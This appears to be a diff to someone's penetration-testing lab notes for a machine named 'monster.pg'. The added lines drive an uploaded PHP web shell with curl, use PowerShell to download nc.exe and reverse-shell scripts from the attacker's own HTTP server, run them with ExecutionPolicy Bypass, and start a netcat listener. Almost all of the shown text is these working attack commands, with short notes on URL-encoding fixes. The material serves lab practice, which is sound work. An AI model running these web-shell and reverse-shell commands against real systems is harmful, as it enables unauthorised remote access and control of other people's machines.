@@ -277,6 +277,7 @@ my ip: 192.168.45.156
 > nc -lvnp 1234
 
 https://www.revshells.com/
+ps#1
 
 > curl 'http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd='
 
@@ -285,3 +286,43 @@ https://www.revshells.com/
 > vim reverse.ps1
 
 ![](image_30.png)
+
+![](image_31.png)
+
+> curl "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=powershell -c iwr -uri http://192.168.45.156/nc.exe -Outfile C:\Windows\Temp\nc.exe"
+
+curl: (3) URL rejected: Malformed input to a URL function
+
+whitespace -> %20
+
+> curl "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.156/nc.exe%20-Outfile%20C:\Windows\Temp\nc.exe"
+
+> http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=powershell -c iwr -uri http://192.168.45.156/reverse.ps1 -Outfile C:\Windows\Temp\reverse.ps1
+
+failed -> whitespace -> %20
+
+> http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.156/reverse.ps1%20-Outfile%20C:\Windows\Temp\reverse.ps1
+
+success
+
+┌──(root㉿docker-desktop)-[/]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.243.180 - - [01/Nov/2026 02:44:47] "GET /reverse.ps1 HTTP/1.1" 200
+
+> curl "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=powershell%20-ExecutionPolicy%20Bypass%20-File%20C:\Windows\Temp\reverse.ps1"
+
+Retry
+
+https://www.revshells.com/
+ps#3
+
+> curl "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.156/reverse.ps2%20-Outfile%20C:\Windows\Temp\reverse.ps2"
+
+> curl "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=powershell%20-ExecutionPolicy%20Bypass%20-File%20C:\Windows\Temp\reverse.ps2"
+
+retry
+
+> curl 'http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=whoami'
+
+> curl -G "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php" --data-urlencode "cmd=whoami"
